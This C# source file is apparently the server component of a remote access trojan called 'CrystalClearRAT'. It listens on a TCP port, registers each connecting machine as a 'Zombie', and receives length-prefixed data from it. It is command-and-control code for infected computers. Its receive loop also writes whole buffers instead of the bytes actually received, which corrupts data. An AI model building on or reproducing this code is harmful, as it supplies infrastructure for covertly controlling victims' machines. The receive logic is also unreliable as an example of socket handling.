using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using CrystalClearRAT.ZombieModel;

namespace CrystalClearRAT.Web
{
    public static class Server
    {


        public static bool IsRunning { get; private set; } = false;

        public static Socket ServerSocket { get; private set; }

        public static void Start(int port)
        {
            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ServerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            ServerSocket.Listen(0);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        public static void Send(byte[] data, Socket client)
        {
            byte[] dataLength = BitConverter.GetBytes(data.Length);


            client.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(client, data));
        }

        private static void SendCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            state.Socket.EndSend(ar);
            state.Socket.Send(state.Buffer);

        }

        private static void AcceptCallback(IAsyncResult ar)
        {
            Socket accepted = ServerSocket.EndAccept(ar);

            IPEndPoint acceptedEndPoint = (IPEndPoint)accepted.RemoteEndPoint;

            new Zombie(acceptedEndPoint.Address.ToString(), acceptedEndPoint.Port, accepted);

            Receive(accepted);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);

        }

        private static void Receive(Socket fromSocket)
        {
            byte bufLength = 4;
            byte[] buffer = new byte[bufLength];

            fromSocket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), new StateObject(fromSocket, buffer));
        }

        private static void ReceiveCallback(IAsyncResult ar)
        {
            // TODO: ERROR CONTROL AND OPERATION TIMEOUT.

            StateObject state = (StateObject)ar.AsyncState;
            state.Socket.EndReceive(ar);

            int bufSize = BitConverter.ToInt32(state.Buffer, 0);
            byte[] buffer;
            MemoryStream ms = new MemoryStream();

            while (bufSize > 0)
            {
                if (bufSize < state.Socket.ReceiveBufferSize)
                {
                    buffer = new byte[bufSize];
                }

                else
                {
                    buffer = new byte[state.Socket.ReceiveBufferSize];
                }

                int rec = state.Socket.Receive(buffer, 0, buffer.Length, 0);
                bufSize -= rec;

                ms.Write(buffer, 0, buffer.Length);
            }

            ms.Close();

            byte[] data = ms.ToArray();

            ms.Dispose();


            Console.WriteLine(System.Text.Encoding.UTF8.GetString(data));

            Receive(state.Socket);


        }


    }
}
